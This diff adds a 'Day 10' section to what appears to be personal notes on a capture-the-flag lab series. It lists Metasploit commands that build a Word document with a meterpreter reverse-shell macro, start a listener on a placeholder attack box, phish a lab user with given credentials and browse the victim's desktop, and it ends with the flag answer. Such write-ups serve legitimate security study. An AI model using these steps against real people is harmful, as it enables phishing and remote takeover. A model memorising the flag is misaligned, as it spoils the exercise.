@@ -280,3 +280,34 @@ $thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
 
 **Concepts:**
 - Risk Management - how they're done, why and where.
+
+# Day 10
+
+**Challenge:**
+- Metasploit Framework is used to create a Word document with macro. The following commands create the document. 
+	- `msfconsole`
+	- `set payload windows/meterpreter/reverse_tcp`
+	- `use exploit/multi/fileformat/office_word_macro`
+	- `set LHOST [ATTACKBOX IP]`
+	- `set LPORT 8888`
+	- `show options`
+	- `exploit`
+	- `exit`
+- The following functions make up the malicious macro: `AutoOpen()` triggers the macro in the MSWord document and also scans the Comments field which contains base64 encoding of the payload. `Base64Decode()` converts it to an executable MS Word file and `ExecuteForWindows()` connects to the attacker's IP.
+- `msfconsole` can again be used to listen in after the malicious document is opened with the following commands: 
+	- `use multi/handler`
+	- `set payload windows/meterpreter/reverse_tcp`
+	- `set LHOST [ATTACKBOX IP]`
+	- `set LPORT 8888`
+	- `show options`
+	- `exploit`
+- The next step is to email the document to `marta@socmas.thm`  using the email `info@socnas.thm` & password `MerryPhishMas!`.
+- After receiving a reverse shell, `meterpreter` allows to run commands such as `cd c:/users/Administrator/Desktop` and `ls` to view files on the target system.
+
+**Questions:**
+1. *What is the flag value inside the `flag.txt` file that’s located on the Administrator’s desktop?*
+**Answer**: THM{PHISHING_CHRISTMAS}. After connecting to the target user's desktop, the following commands can be run: `cd c:/users/Administrator/Desktop`, `ls`, `cat flag.txt`.
+
+**Concepts:**
+- Understanding phishing attacks
+- Using msfconsole to create a document with a malicious macro and to get the reverse shell.
